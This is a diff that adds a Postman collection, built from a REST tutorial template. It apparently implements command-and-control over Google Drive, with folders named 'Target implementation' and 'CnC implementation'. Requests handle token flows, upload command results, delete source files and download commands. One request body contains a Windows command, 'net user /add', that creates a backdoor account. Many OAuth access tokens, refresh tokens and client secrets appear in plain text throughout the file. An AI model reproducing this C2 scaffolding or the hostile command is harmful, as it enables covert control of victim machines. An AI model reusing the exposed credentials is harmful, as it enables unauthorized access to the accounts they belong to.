@@ -1,0 +1,839 @@
+{
+	"info": {
+		"_postman_id": "67343ffc-03d7-4419-8215-b1567561722e",
+		"name": "REST API basics: CRUD, test & variable",
+		"description": "# 🚀 Get started here\n\nThis template guides you through CRUD operations (GET, POST, PUT, DELETE), variables, and tests.\n\n## 🔖 **How to use this template**\n\n#### **Step 1: Send requests**\n\nRESTful APIs allow you to perform CRUD operations using the POST, GET, PUT, and DELETE HTTP methods.\n\nThis collection contains each of these [request](https://learning.postman.com/docs/sending-requests/requests/) types. Open each request and click \"Send\" to see what happens.\n\n#### **Step 2: View responses**\n\nObserve the response tab for status code (200 OK), response time, and size.\n\n#### **Step 3: Send new Body data**\n\nUpdate or add new data in \"Body\" in the POST request. Typically, Body data is also used in PUT request.\n\n```\n{\n    \"name\": \"Add your name in the body\"\n}\n\n ```\n\n#### **Step 4: Update the variable**\n\nVariables enable you to store and reuse values in Postman. We have created a [variable](https://learning.postman.com/docs/sending-requests/variables/) called `base_url` with the sample request [https://postman-api-learner.glitch.me](https://postman-api-learner.glitch.me). Replace it with your API endpoint to customize this collection.\n\n#### **Step 5: Add tests in the \"Scripts\" tab**\n\nAdding tests to your requests can help you confirm that your API is working as expected. You can write test scripts in JavaScript and view the output in the \"Test Results\" tab.\n\n<img src=\"https://content.pstmn.io/fa30ea0a-373d-4545-a668-e7b283cca343/aW1hZ2UucG5n\" alt=\"\" height=\"1530\" width=\"2162\">\n\n## 💪 Pro tips\n\n- Use folders to group related requests and organize the collection.\n    \n- Add more [scripts](https://learning.postman.com/docs/writing-scripts/intro-to-scripts/) to verify if the API works as expected and execute workflows.\n    \n\n## 💡Related templates\n\n[API testing basics](https://go.postman.co/redirect/workspace?type=personal&collectionTemplateId=e9a37a28-055b-49cd-8c7e-97494a21eb54&sourceTemplateId=ddb19591-3097-41cf-82af-c84273e56719)  \n[API documentation](https://go.postman.co/redirect/workspace?type=personal&collectionTemplateId=e9c28f47-1253-44af-a2f3-20dce4da1f18&sourceTemplateId=ddb19591-3097-41cf-82af-c84273e56719)  \n[Authorization methods](https://go.postman.co/redirect/workspace?type=personal&collectionTemplateId=31a9a6ed-4cdf-4ced-984c-d12c9aec1c27&sourceTemplateId=ddb19591-3097-41cf-82af-c84273e56719)",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "37271825",
+		"_collection_link": "https://rshcmd.postman.co/workspace/RShCMD-Workspace~80bde8e0-d93c-4f30-8bd9-b8428682694a/collection/37042495-67343ffc-03d7-4419-8215-b1567561722e?action=share&source=collection_link&creator=37271825"
+	},
+	"item": [
+		{
+			"name": "Not implemented in script",
+			"item": [
+				{
+					"name": "Delete file",
+					"request": {
+						"method": "DELETE",
+						"header": [],
+						"url": {
+							"raw": "https://www.googleapis.com/drive/v3/files/1-hhvQGN-0sZRYOWmEof6pIUSPf6SLhTx?access_token=ya29.a0AXooCgvAho8rHIrq5Co0ve96P9BYod4z9KuoOxDqI0kmWb8fdC8T4vrGaytDYTDadZaLvycCBGNMcZ2byL3Lwp1frXbUjUnRtXj2vQT0FH_-YztILtGnqh1XYsP2tXYybml4R8ZLAx695WjmnliIHZL3IUQjRTTDpXaacwaCgYKAdoSARASFQHGX2MiBjtnflTjUhZvQrOpyxcAWA0173",
+							"protocol": "https",
+							"host": [
+								"www",
+								"googleapis",
+								"com"
+							],
+							"path": [
+								"drive",
+								"v3",
+								"files",
+								"1-hhvQGN-0sZRYOWmEof6pIUSPf6SLhTx"
+							],
+							"query": [
+								{
+									"key": "access_token",
+									"value": "ya29.a0AXooCgvAho8rHIrq5Co0ve96P9BYod4z9KuoOxDqI0kmWb8fdC8T4vrGaytDYTDadZaLvycCBGNMcZ2byL3Lwp1frXbUjUnRtXj2vQT0FH_-YztILtGnqh1XYsP2tXYybml4R8ZLAx695WjmnliIHZL3IUQjRTTDpXaacwaCgYKAdoSARASFQHGX2MiBjtnflTjUhZvQrOpyxcAWA0173"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Get file list",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://www.googleapis.com/drive/v3/files/?access_token=ya29.a0AcM612w6g5OzUAy-5ce_lsaGxJMp37-dmzXqNWRPlMsQCIzxCSghliLP8o_59R5MqHWHEWJsFiooShZC_4hKqbhghewzhakwOapUeB7iiv46DggR9dW3nVR5mWZcbOSI0tJSG0W4INrJG0aszx2kTznzMGCTqpd47Ln0njJp7AaCgYKAQYSARASFQHGX2Mi7OqFuCgExG2qPjqjj35GMg0177",
+							"protocol": "https",
+							"host": [
+								"www",
+								"googleapis",
+								"com"
+							],
+							"path": [
+								"drive",
+								"v3",
+								"files",
+								""
+							],
+							"query": [
+								{
+									"key": "fields",
+									"value": "user,storageQuota",
+									"disabled": true
+								},
+								{
+									"key": "access_token",
+									"value": "ya29.a0AcM612w6g5OzUAy-5ce_lsaGxJMp37-dmzXqNWRPlMsQCIzxCSghliLP8o_59R5MqHWHEWJsFiooShZC_4hKqbhghewzhakwOapUeB7iiv46DggR9dW3nVR5mWZcbOSI0tJSG0W4INrJG0aszx2kTznzMGCTqpd47Ln0njJp7AaCgYKAQYSARASFQHGX2Mi7OqFuCgExG2qPjqjj35GMg0177"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Uploading a simple text (Upload type media)",
+					"protocolProfileBehavior": {
+						"disabledSystemHeaders": {}
+					},
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "net user /add ehsan 134234\r\ndir \\n jddafsd",
+							"options": {
+								"raw": {
+									"language": "text"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://www.googleapis.com/upload/drive/v3/files?access_token=ya29.a0AXooCgu5PpFXcpnLV24pGLbcPZFGYXHG3Qa8lVpmp602uj-yhbeOpJF92prnpCdOshgzwxlk-X9T4Bqg4UwziPT1eHSELPHZjne67OcE7W6t9XtxgY9iczg_pKDWFNxVj4xwyDlx4GLerc1CCd8iW-aJQgRAzvKkjWHcaCgYKATUSARASFQHGX2Miy_s1_eOdMKY9d9mpkPDI9Q0171&uploadType=media",
+							"protocol": "https",
+							"host": [
+								"www",
+								"googleapis",
+								"com"
+							],
+							"path": [
+								"upload",
+								"drive",
+								"v3",
+								"files"
+							],
+							"query": [
+								{
+									"key": "access_token",
+									"value": "ya29.a0AXooCgu5PpFXcpnLV24pGLbcPZFGYXHG3Qa8lVpmp602uj-yhbeOpJF92prnpCdOshgzwxlk-X9T4Bqg4UwziPT1eHSELPHZjne67OcE7W6t9XtxgY9iczg_pKDWFNxVj4xwyDlx4GLerc1CCd8iW-aJQgRAzvKkjWHcaCgYKATUSARASFQHGX2Miy_s1_eOdMKY9d9mpkPDI9Q0171"
+								},
+								{
+									"key": "uploadType",
+									"value": "media"
+								},
+								{
+									"key": "Content-Type",
+									"value": "multipart/related",
+									"disabled": true
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Validate Access Token",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://oauth2.googleapis.com/tokeninfo?=1//09mt_G8WQts9XCgYIARAAGAkSNwF-L9IrqUICbcNlRFj27jFrk3Py7PQSj41VRDv7eTnh1YPl-HOkXSDBRiJOMJWCzuIvr_LRmEc",
+							"protocol": "https",
+							"host": [
+								"oauth2",
+								"googleapis",
+								"com"
+							],
+							"path": [
+								"tokeninfo"
+							],
+							"query": [
+								{
+									"key": "",
+									"value": "1//09mt_G8WQts9XCgYIARAAGAkSNwF-L9IrqUICbcNlRFj27jFrk3Py7PQSj41VRDv7eTnh1YPl-HOkXSDBRiJOMJWCzuIvr_LRmEc"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			],
+			"description": "Just for initialization and test purposes"
+		},
+		{
+			"name": "Uploading a file in two parts",
+			"item": [
+				{
+					"name": "Uploading Metadata",
+					"protocolProfileBehavior": {
+						"disabledSystemHeaders": {}
+					},
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json; charset=UTF-8",
+								"type": "text"
+							},
+							{
+								"key": "Authorization",
+								"value": "Bearer ya29.a0AXooCgt7gJDnXZRFSilTQWq1K3yn7-rcPhN99Adw_63h6NBgXht6xVFQEBVlI1Vjnxa7x4_bqllhpZjj0K69zUfEcHntO0QQBNqv6uADs8252G1JJP6aEF5RZKGOPR2ZoX5UleS58snR1VBfQtE3oohHxYLGUNS3qAX_sgaCgYKAa0SARASFQHGX2MiB45EG80EOhCJ11ey1pC7Ug0173",
+								"type": "text",
+								"disabled": true
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\r\n  \"name\": \"Result.txt\",\r\n  \"mimeType\": \"text/plain\",\r\n  \"parents\": [\"132JEd1SCuApWQHS77TxbYb-Ph_XFHCjp\"]\r\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://www.googleapis.com/upload/drive/v3/files?access_token=ya29.a0AXooCguIsDoPF5dwaGktq_UPUHXjcjlHe4XQLbDVm4Do31yWMUMpom5gZOHAgpGsFT45pskkQ9T_el1GtS38bxRL7p66JT9UNVDxF6wd-RPFwFj6joVBv9Gnl4fPF1VcLOsn983oeMSm-j8uIkJU3oNgG_VXS1kqXN_1pQaCgYKAS8SARASFQHGX2MiLrQcO20gmBEQmM6BLoqXWA0173&uploadType=resumable",
+							"protocol": "https",
+							"host": [
+								"www",
+								"googleapis",
+								"com"
+							],
+							"path": [
+								"upload",
+								"drive",
+								"v3",
+								"files"
+							],
+							"query": [
+								{
+									"key": "access_token",
+									"value": "ya29.a0AXooCguIsDoPF5dwaGktq_UPUHXjcjlHe4XQLbDVm4Do31yWMUMpom5gZOHAgpGsFT45pskkQ9T_el1GtS38bxRL7p66JT9UNVDxF6wd-RPFwFj6joVBv9Gnl4fPF1VcLOsn983oeMSm-j8uIkJU3oNgG_VXS1kqXN_1pQaCgYKAS8SARASFQHGX2MiLrQcO20gmBEQmM6BLoqXWA0173"
+								},
+								{
+									"key": "uploadType",
+									"value": "resumable"
+								}
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Uploading Data",
+					"request": {
+						"method": "PUT",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "Hello "
+						},
+						"url": {
+							"raw": "https://www.googleapis.com/upload/drive/v3/files?access_token=ya29.a0AcM612wVwovx6K_TKVFUOUQ7V2G6DQvgTodVnpxb1nIg7AZJEFC6A9ZHZynp4f93A4Z3pcIFURQdlrESF3lI_hqL-IlsnxEpOSLaQnD1GonQjD_Ur88SBnkqYmyWQmKtTScZfKawe1081dJvfZNlQ4OIcsIPDDA6l9MhUwaCgYKAWcSARASFQHGX2MimbwU_I1639inb-MQ8xIkBg0173&uploadType=resumable&upload_id=AHxI1nMHYw57OjjQVVOPqzNK5tbPquwgLtMcWiNAEBtuU0uL7UsYsBIDzR5Xf3WefOV1UgfZFu2YWghDR3p4psQEtYKhBmW2DpwXHgD_XqNJpsO0sw&session_crd=AHSoBRWBFz7xeJS4RgPiTUfPQd-62J7LNtW6e6nP9zq7v8S_Ljyo8WfrtBeORfQddxpsaKXrR0O9l4REC0A",
+							"protocol": "https",
+							"host": [
+								"www",
+								"googleapis",
+								"com"
+							],
+							"path": [
+								"upload",
+								"drive",
+								"v3",
+								"files"
+							],
+							"query": [
+								{
+									"key": "access_token",
+									"value": "ya29.a0AcM612wVwovx6K_TKVFUOUQ7V2G6DQvgTodVnpxb1nIg7AZJEFC6A9ZHZynp4f93A4Z3pcIFURQdlrESF3lI_hqL-IlsnxEpOSLaQnD1GonQjD_Ur88SBnkqYmyWQmKtTScZfKawe1081dJvfZNlQ4OIcsIPDDA6l9MhUwaCgYKAWcSARASFQHGX2MimbwU_I1639inb-MQ8xIkBg0173"
+								},
+								{
+									"key": "uploadType",
+									"value": "resumable"
+								},
+								{
+									"key": "upload_id",
+									"value": "AHxI1nMHYw57OjjQVVOPqzNK5tbPquwgLtMcWiNAEBtuU0uL7UsYsBIDzR5Xf3WefOV1UgfZFu2YWghDR3p4psQEtYKhBmW2DpwXHgD_XqNJpsO0sw"
+								},
+								{
+									"key": "session_crd",
+									"value": "AHSoBRWBFz7xeJS4RgPiTUfPQd-62J7LNtW6e6nP9zq7v8S_Ljyo8WfrtBeORfQddxpsaKXrR0O9l4REC0A"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Target implementation",
+			"item": [
+				{
+					"name": "Get authorization code target",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://accounts.google.com/o/oauth2/v2/auth?client_id=1013834111625-kc1mpb1btv5e7nci2lak6f4v8nklon3p.apps.googleusercontent.com&redirect_uri=http://localhost&response_type=code &scope=https://www.googleapis.com/auth/drive&access_type=offline&include_granted_scopes=true",
+							"protocol": "https",
+							"host": [
+								"accounts",
+								"google",
+								"com"
+							],
+							"path": [
+								"o",
+								"oauth2",
+								"v2",
+								"auth"
+							],
+							"query": [
+								{
+									"key": "client_id",
+									"value": "1013834111625-kc1mpb1btv5e7nci2lak6f4v8nklon3p.apps.googleusercontent.com"
+								},
+								{
+									"key": "redirect_uri",
+									"value": "http://localhost"
+								},
+								{
+									"key": "response_type",
+									"value": "code "
+								},
+								{
+									"key": "scope",
+									"value": "https://www.googleapis.com/auth/drive"
+								},
+								{
+									"key": "access_type",
+									"value": "offline"
+								},
+								{
+									"key": "include_granted_scopes",
+									"value": "true"
+								}
+							]
+						},
+						"description": "This is a GET request and it is used to \"get\" data from an endpoint. There is no request body for a GET request, but you can use query parameters to help specify the resource you want data on (e.g., in this request, we have `id=1`).\n\nA successful GET response will have a `200 OK` status, and should include some kind of response body - for example, HTML web content or JSON data."
+					},
+					"response": []
+				},
+				{
+					"name": "Post & Get tokens target",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "client_id",
+									"value": "1013834111625-kc1mpb1btv5e7nci2lak6f4v8nklon3p.apps.googleusercontent.com",
+									"type": "text"
+								},
+								{
+									"key": "client_secret",
+									"value": "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",
+									"type": "text"
+								},
+								{
+									"key": "code",
+									"value": "4/0ASVgi3ILJvTEtjJr_egFNkx1CIQfcLYlG65JpT0_OOQ-VbgEnZ6UDOD7OrU1F6dnHOl_Iw",
+									"type": "text"
+								},
+								{
+									"key": "grant_type",
+									"value": "authorization_code",
+									"type": "text"
+								},
+								{
+									"key": "redirect_uri",
+									"value": "http://localhost",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "https://oauth2.googleapis.com/token",
+							"protocol": "https",
+							"host": [
+								"oauth2",
+								"googleapis",
+								"com"
+							],
+							"path": [
+								"token"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Post & Get tokens (Using refresh token) target",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "client_id",
+									"value": "1013834111625-kc1mpb1btv5e7nci2lak6f4v8nklon3p.apps.googleusercontent.com",
+									"type": "text"
+								},
+								{
+									"key": "client_secret",
+									"value": "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",
+									"type": "text"
+								},
+								{
+									"key": "grant_type",
+									"value": "refresh_token",
+									"type": "text"
+								},
+								{
+									"key": "refresh_token",
+									"value": "1//03263N6jS7d6TCgYIARAAGAMSNwF-L9Irn4u11nS_Q6Btl1S88WilfGjVcnakac_1YDB3chyZw8caf2ppdejE5nOI5ixhAaIlKaw",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "https://oauth2.googleapis.com/token",
+							"protocol": "https",
+							"host": [
+								"oauth2",
+								"googleapis",
+								"com"
+							],
+							"path": [
+								"token"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "CnC implementation",
+			"item": [
+				{
+					"name": "Get authorization code",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript",
+								"packages": {}
+							}
+						}
+					],
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "https://accounts.google.com/o/oauth2/v2/auth?client_id=1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com&redirect_uri=http://localhost&response_type=code &scope=https://www.googleapis.com/auth/drive&access_type=offline&include_granted_scopes=true",
+							"protocol": "https",
+							"host": [
+								"accounts",
+								"google",
+								"com"
+							],
+							"path": [
+								"o",
+								"oauth2",
+								"v2",
+								"auth"
+							],
+							"query": [
+								{
+									"key": "client_id",
+									"value": "1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com"
+								},
+								{
+									"key": "redirect_uri",
+									"value": "http://localhost"
+								},
+								{
+									"key": "response_type",
+									"value": "code "
+								},
+								{
+									"key": "scope",
+									"value": "https://www.googleapis.com/auth/drive"
+								},
+								{
+									"key": "access_type",
+									"value": "offline"
+								},
+								{
+									"key": "include_granted_scopes",
+									"value": "true"
+								}
+							]
+						},
+						"description": "This is a GET request and it is used to \"get\" data from an endpoint. There is no request body for a GET request, but you can use query parameters to help specify the resource you want data on (e.g., in this request, we have `id=1`).\n\nA successful GET response will have a `200 OK` status, and should include some kind of response body - for example, HTML web content or JSON data."
+					},
+					"response": []
+				},
+				{
+					"name": "Post & Get tokens",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "client_id",
+									"value": "1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com",
+									"type": "text"
+								},
+								{
+									"key": "client_secret",
+									"value": "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",
+									"type": "text"
+								},
+								{
+									"key": "code",
+									"value": "4/0AeanS0ZZfVfRReDvPFmtN_Jdod38MiTXu8jUJU-GhbzNBLlStkPUBc-PbPfspZnclQqotQ",
+									"type": "text"
+								},
+								{
+									"key": "grant_type",
+									"value": "authorization_code",
+									"type": "text"
+								},
+								{
+									"key": "redirect_uri",
+									"value": "http://localhost",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "https://oauth2.googleapis.com/token",
+							"protocol": "https",
+							"host": [
+								"oauth2",
+								"googleapis",
+								"com"
+							],
+							"path": [
+								"token"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Post & Get tokens (Using refresh token)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "client_id",
+									"value": "1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com",
+									"type": "text"
+								},
+								{
+									"key": "client_secret",
+									"value": "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",
+									"type": "text"
+								},
+								{
+									"key": "grant_type",
+									"value": "refresh_token",
+									"type": "text"
+								},
+								{
+									"key": "refresh_token",
+									"value": "1//0c6oTPVPNfJJuCgYIARAAGAwSNwF-L9IrzM2CovLHS8PdOzTCuN7k9tUHg194rdjm7yKiZSiNGpVzoKTqFKlQYUjefIG9wWWjV8s",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "https://oauth2.googleapis.com/token",
+							"protocol": "https",
+							"host": [
+								"oauth2",
+								"googleapis",
+								"com"
+							],
+							"path": [
+								"token"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "Uploading Result",
+			"protocolProfileBehavior": {
+				"disabledSystemHeaders": {
+					"content-type": true
+				}
+			},
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "multipart/related; boundary=boundary",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "--boundary\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n{\"name\": \"test.txt\",\"mimeType\": \"text/plain\",\"parents\": [\"10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB\"]}\r\n--boundary\r\nContent-Type: text/plain\r\n\r\ndir\r\n--boundary--",
+					"options": {
+						"raw": {
+							"language": "text"
+						}
+					}
+				},
+				"url": {
+					"raw": "https://www.googleapis.com/upload/drive/v3/files/?uploadType=multipart&access_token=ya29.a0AcM612y8ud9v6ti0k0KNzGMHz3_C4PtYu-S1sjpq57V5meVhcYn0zyTbFlxy8xJnirFcWWMrwBXYCcIyTEfODEwPe_PVAxGbhFnL-Xip92wzO2_S12z4LTEBpqXmpabvUidgUDKppafMEqpbX5J9WyvvzXWUAcwkho9s1OSlVQaCgYKAd4SARASFQHGX2Mi8ycLFIEVKcU3PxVLEYbykA0177",
+					"protocol": "https",
+					"host": [
+						"www",
+						"googleapis",
+						"com"
+					],
+					"path": [
+						"upload",
+						"drive",
+						"v3",
+						"files",
+						""
+					],
+					"query": [
+						{
+							"key": "uploadType",
+							"value": "multipart"
+						},
+						{
+							"key": "access_token",
+							"value": "ya29.a0AcM612y8ud9v6ti0k0KNzGMHz3_C4PtYu-S1sjpq57V5meVhcYn0zyTbFlxy8xJnirFcWWMrwBXYCcIyTEfODEwPe_PVAxGbhFnL-Xip92wzO2_S12z4LTEBpqXmpabvUidgUDKppafMEqpbX5J9WyvvzXWUAcwkho9s1OSlVQaCgYKAd4SARASFQHGX2Mi8ycLFIEVKcU3PxVLEYbykA0177"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Deleting Source Context",
+			"protocolProfileBehavior": {
+				"disabledSystemHeaders": {}
+			},
+			"request": {
+				"method": "PATCH",
+				"header": [],
+				"url": {
+					"raw": "https://www.googleapis.com/upload/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?access_token=ya29.a0AcM612xfT0lU3-cKPOv_UHZN71yF1fuc5VtsOjYnUp8KNqXeYZRe81O9JJYiZ-1SVAKSqJbQdofTP7W8NgxWpkXRRaADQBf8skiYMAyicHt9KLQIzNb0zn4KHPyAeYZJo9bsUH0oGm8Y5elzRNjxSM_h96oIZw5zHNrZ2waCgYKAToSARASFQHGX2Mi1PDaRdCAMp5WEMJsc_Ee6g0173&uploadType=media",
+					"protocol": "https",
+					"host": [
+						"www",
+						"googleapis",
+						"com"
+					],
+					"path": [
+						"upload",
+						"drive",
+						"v3",
+						"files",
+						"1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er"
+					],
+					"query": [
+						{
+							"key": "access_token",
+							"value": "ya29.a0AcM612xfT0lU3-cKPOv_UHZN71yF1fuc5VtsOjYnUp8KNqXeYZRe81O9JJYiZ-1SVAKSqJbQdofTP7W8NgxWpkXRRaADQBf8skiYMAyicHt9KLQIzNb0zn4KHPyAeYZJo9bsUH0oGm8Y5elzRNjxSM_h96oIZw5zHNrZ2waCgYKAToSARASFQHGX2Mi1PDaRdCAMp5WEMJsc_Ee6g0173"
+						},
+						{
+							"key": "uploadType",
+							"value": "media"
+						},
+						{
+							"key": "Content-Type",
+							"value": "multipart/related",
+							"disabled": true
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Downloading a file",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							""
+						],
+						"type": "text/javascript",
+						"packages": {}
+					}
+				}
+			],
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Authorization",
+						"value": "Bearer ya29.a0AcM612wnlj_XZlpZBiKLV3xMwVdjr5vput3q--SJmUEjg3oSvangSS-qergtYd0PCUWuJtYnM4LalDxYdjilTB5kRvRg2d5mCFnjD-uf83ri09I028BxekAkWPnIOHvXghkL4e_xSp9zTj7NtPX0O3CA4hjrEyFo8qP-zv2OkQaCgYKAQkSARASFQHGX2Mi5edTkS84I02ohFm8OYmlnQ0177",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "https://www.googleapis.com/drive/v3/files/1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er?alt=media&acknowledgeAbuse=true&mimeType=text/plain",
+					"protocol": "https",
+					"host": [
+						"www",
+						"googleapis",
+						"com"
+					],
+					"path": [
+						"drive",
+						"v3",
+						"files",
+						"1_tWWjOBiwEFivD8Ua6rwEF4JQfq7t1er"
+					],
+					"query": [
+						{
+							"key": "alt",
+							"value": "media"
+						},
+						{
+							"key": "acknowledgeAbuse",
+							"value": "true"
+						},
+						{
+							"key": "mimeType",
+							"value": "text/plain"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request IDs & Names for a Specific Folder",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://www.googleapis.com/drive/v3/files?q=%2710a_TCWM1Txsjy-SkkQMen2eytaZKLgdB%27+in+parents&fields=files(id, name)&access_token=ya29.a0AcM612w5k6OExc6QOw_r4IcPnxtWogaI2uBMqk7x03hjECJyCeutiK0KR9nlphF15DgbCB5PyoQLnHY5bB-Lw96zaOQKSGpni4m5NH_NoexFd2_FhT8pWjhZcjkyTsJeEjsX5RXG1ZbYNk_Gbk_DxYY9Y5WrzkgOlEeba_IWnAaCgYKAXMSARASFQHGX2MiNej9IV8sxYL4NPIKmcIQkw0177",
+					"protocol": "https",
+					"host": [
+						"www",
+						"googleapis",
+						"com"
+					],
+					"path": [
+						"drive",
+						"v3",
+						"files"
+					],
+					"query": [
+						{
+							"key": "q",
+							"value": "%2710a_TCWM1Txsjy-SkkQMen2eytaZKLgdB%27+in+parents"
+						},
+						{
+							"key": "fields",
+							"value": "files(id, name)"
+						},
+						{
+							"key": "access_token",
+							"value": "ya29.a0AcM612w5k6OExc6QOw_r4IcPnxtWogaI2uBMqk7x03hjECJyCeutiK0KR9nlphF15DgbCB5PyoQLnHY5bB-Lw96zaOQKSGpni4m5NH_NoexFd2_FhT8pWjhZcjkyTsJeEjsX5RXG1ZbYNk_Gbk_DxYY9Y5WrzkgOlEeba_IWnAaCgYKAXMSARASFQHGX2MiNej9IV8sxYL4NPIKmcIQkw0177"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Get Refresh Token Failsafe",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://drive.google.com/uc?export=download&id=1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1",
+					"protocol": "https",
+					"host": [
+						"drive",
+						"google",
+						"com"
+					],
+					"path": [
+						"uc"
+					],
+					"query": [
+						{
+							"key": "export",
+							"value": "download"
+						},
+						{
+							"key": "id",
+							"value": "1PE_bOI--Ti8exPg6hkq_yIhYBipOVZT1"
+						}
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "id",
+			"value": "1"
+		},
+		{
+			"key": "base_url",
+			"value": "https://postman-rest-api-learner.glitch.me/"
+		},
+		{
+			"key": "access_token",
+			"value": "ya29.a0AXooCgu5PpFXcpnLV24pGLbcPZFGYXHG3Qa8lVpmp602uj-yhbeOpJF92prnpCdOshgzwxlk-X9T4Bqg4UwziPT1eHSELPHZjne67OcE7W6t9XtxgY9iczg_pKDWFNxVj4xwyDlx4GLerc1CCd8iW-aJQgRAzvKkjWHcaCgYKATUSARASFQHGX2Miy_s1_eOdMKY9d9mpkPDI9Q0171"
+		}
+	]
+}
